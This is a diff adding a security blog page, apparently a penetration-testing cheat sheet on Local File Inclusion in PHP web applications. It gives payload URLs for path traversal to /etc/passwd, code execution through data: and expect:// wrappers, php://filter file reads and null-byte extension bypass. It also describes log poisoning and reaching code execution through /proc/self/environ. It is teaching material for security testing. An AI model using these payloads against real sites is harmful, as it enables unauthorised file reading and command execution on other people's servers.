@@ -1,0 +1,113 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+        <title>mtnalonso.com - LFI</title>
+        <link href="https://fonts.googleapis.com/css?family=Press+Start+2P" rel="stylesheet">
+        <link rel="stylesheet" type="text/css" href="/css/nes.min.css">
+        <link rel="stylesheet" type="text/css" href="/css/styles.css">
+        <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.15.10/styles/default.min.css">
+        <script src="/js/script.js"></script>
+        <script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.15.10/highlight.min.js"></script>
+        <script>hljs.initHighlightingOnLoad();</script>
+<style>
+    .container {
+        display: flex;
+        flex-direction: column;
+        justify-content: center;
+        align-items: center;
+    }
+    .item {
+        display: flex;
+    }
+</style>
+    </head>
+    <body>
+        <nav>
+            <hr>
+            <a class="nes-btn is-error" href="/"><-</a> |
+            <a class="nes-btn is-primary" href="">BLOG</a> |
+            <a class="nes-btn is-success" href="">SECURITY</a> |
+            <a class="nes-btn is-warning" href="/about-me">ABOUT ME</a> |
+            <a class="nes-btn is-disabled" href="">LANGUAGE</a>
+            <hr>
+        </nav>
+        <main>  
+            <h1>LFI (Local File Inclusion)</h1>
+            <br>
+            <section id="identification">
+                <h2><a href="#identification">#</a> Identification</h2>
+                <br>
+                <p>File Inclusion vulnerabilities are usually easy to identify. The common case is to have a GET parameter in the url that indicates which page to load.</p>
+                <pre><code class="hljs">
+http://www.example.com?page=login
+                </code></pre>
+            </section>
+            <br>
+            <section id="exploitation">
+                <h2><a href="#exploitation">#</a> Exploitation</h2>
+                <p>Try to load known system files as <code>/etc/passwd</code> in Linux. If the target file doesn't get rendered, keep adding <code>../</code> until the file is reached.</p>
+                <pre><code class="hljs">
+http://www.example.com?page=../../../../../../etc/passwd
+                </code></pre>
+                <p>The following <a href="https://pastebin.com/TLzMnCFx">cheatsheet</a> (by <a href="https://twitter.com/DragonJAR">@DragonJAR</a>) contains a list of common *nix payloads to exploit on a LFI vulnerability.</p>
+                <br>
+                <section class="nes-container with-title border-red">
+                    <h2 class="title">RCE via log poisoning</h2>
+                    <p>Being able to load the access / error logs (i.e.: apache logs), by smuggling code statements in some requests, those statements could be executed later when loading the logs.</p>
+                </section>
+                <section class="nes-container with-title border-red">
+                    <h2 class="title">RCE by including /proc/self/environ</h2>
+                    <p>If the file <b class="nes-text is-primary">/proc/self/environ</b> can be loaded in the vulnerable page, it is possible to execute code by sending statments on the <b class="nes-text is-primary">User-Agent</b> HTTP Request.</p>
+                </section>
+                <br>
+            </section>
+            <br>
+            <section id="tricks" class="container">
+                <h2 style="width:100%"><a href="#tricks">#</a> Tricks</h2>
+                <section class="nes-container with-title border-blue" style="width:100%">
+                    <h2 class="title">PHP Wrappers</h2>
+                    <p>Inject code directly into the page:</p>
+                    <pre style="width:100%"><code class="hljs html">
+http://www.example.com?page=data:text/plain,hello friend
+http://www.example.com?page=data:text/plain,&lt;?php echo shell_exec("ls")?&gt;
+                    </code></pre>
+                    <p>Execute system commands via the <a href="https://www.php.net/manual/en/wrappers.expect.php">expect</a> wrapper (disabled by default):</p>
+                    <pre style="width:100%"><code class="hljs html">
+http://www.example.com?page=expect://ls
+                    </code></pre>
+                    <p>Encode the file's content in Base64 and include it in the page (useful to read PHP files instead of executing them):
+                    <pre style="width:100%"><code class="hljs html">
+http://www.example.com?page=php://filter/convert.base64-encode/resource=/etc/passwd
+                    </code></pre>
+                </section>
+                <section class="nes-container with-title border-blue" style="width:100%">
+                    <h2 class="title">Escape file extension by adding Null Byte</h2>
+                    <p style="width:100%">Sometimes the web application adds a file extension to the requested file (i.e.: .php). By adding a Null Byte "<b class="nes-text is-primary">%00</b>" at the end of the requested file, it might be possible to bypass that.</p>
+                    <pre style="width:100%"><code class="hljs html">
+http://www.example.com?page=/etc/passwd%00
+http://www.example.com?page=/etc/passwd%2500
+                    </code></pre>
+                </section>
+            </section>
+            <br><br><br>
+            <section id="sources" class="nes-container with-title">
+                <h2 class="title">Sources</h2>
+                <a href="https://highon.coffee/blog/lfi-cheat-sheet/">LFI Cheat Sheet</a> by <a href="https://twitter.com/Arr0way">@Arr0way</a><br>
+                <a href="https://www.1337pwn.com/how-to-hack-a-website-using-local-file-inclusion-lfi/">How To Hack A Website Using Local File Inclusion (LFI)</a> by <a href="https://twitter.com/SunnyHoi">@SunnyHoi</a><br>
+                <a href="https://medium.com/@Aptive/local-file-inclusion-lfi-web-application-penetration-testing-cc9dc8dd3601">Local File Inclusion (LFI) — Web Application Penetration Testing</a> by <a href="https://twitter.com/AptiveSec">@AptiveSec</a><br>
+                <a href="https://pastebin.com/TLzMnCFx">LFI payloads for *NIX environments</a> by <a href="https://twitter.com/DragonJAR">@DragonJAR</a><br>
+                <a href="https://www.php.net/manual/en/wrappers.php">PHP: Supported Protocols and Wrappers</a> - PHP Manual<br>
+            </section>
+        </main>
+        <!--
+        <footer>
+            <a href="mailto:mtnalonso@pm.me"><i class="nes-icon gmail is-small"></i></a>
+            <a href="https://github.com/mtnalonso"><i class="nes-icon github is-small"></i></a>
+            <a href="https://twitter.com/mtnalonso"><i class="nes-icon twitter is-small"></i></a>
+            <a href="https://www.linkedin.com/in/MartinAlonsoVilar"><i class="nes-icon linkedin is-small"></i></a>
+            <b>Style: <a href="https://nostalgic-css.github.io/NES.css/">NES.css</a></b>
+        </footer>
+        -->
+    </body>
+</html>
